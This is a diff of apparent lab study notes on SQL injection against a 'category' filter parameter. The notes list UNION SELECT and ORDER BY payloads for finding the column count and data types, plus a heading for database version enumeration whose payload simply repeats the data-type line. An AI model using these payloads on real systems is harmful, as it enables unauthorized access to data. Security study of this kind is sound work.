@@ -40,9 +40,12 @@ Ans  : GET /filter?category='
      - No of Columns
        ' union select null --+ Error
        ' union select null,null --+ 
-       
+
        ' order by 1--+
        ' order by 2--+
        ' order by 3--+ Error
-
-
+     - Data Type
+       ' union select 'ABC','DEF' --+
+     -MySQL and Microsoft DB Version
+       ' union select 'ABC','DEF' --+
+       
